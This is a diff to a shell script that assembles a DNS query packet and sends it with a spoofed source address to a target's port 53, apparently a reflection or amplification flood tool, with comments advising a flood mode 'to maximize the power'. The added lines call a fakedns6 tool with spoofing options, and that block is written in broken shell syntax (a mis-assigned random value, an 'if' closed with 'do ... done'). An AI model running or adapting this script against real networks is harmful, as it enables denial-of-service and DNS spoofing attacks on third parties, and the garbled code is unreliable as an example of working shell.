@@ -9,7 +9,6 @@ do
   echo -en "\x`printf '%x\n' $size`" >> dns_mid.bin
   echo -n "$var" >> dns_mid.bin
 done
-echo '10s to start attack...'
 # set a random TxID
 echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
 echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
@@ -18,5 +17,13 @@ cat txid.bin dns_start.bin dns_mid.bin dns_end.bin dns_OPT.bin > dns.bin
 # change the sending speed if necessary (-i). Set it to "flood" (replace -i with --flood) to maximize the power.
 # fire!
 echo "fire"
-#sudo hping3 $1 -2 -p 53 -E dns.bin -d `du -b dns.bin | awk '{print $1}'` -i u50000 -a $2
 udp6 -d $1 -a 53 -Z dns.bin -r 50pps -s $2
+a=$RANDOM %10
+echo 8
+if a>8
+do
+  ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0 -f 1 >/dev/null 2>&1
+  echo 1
+done
+
+
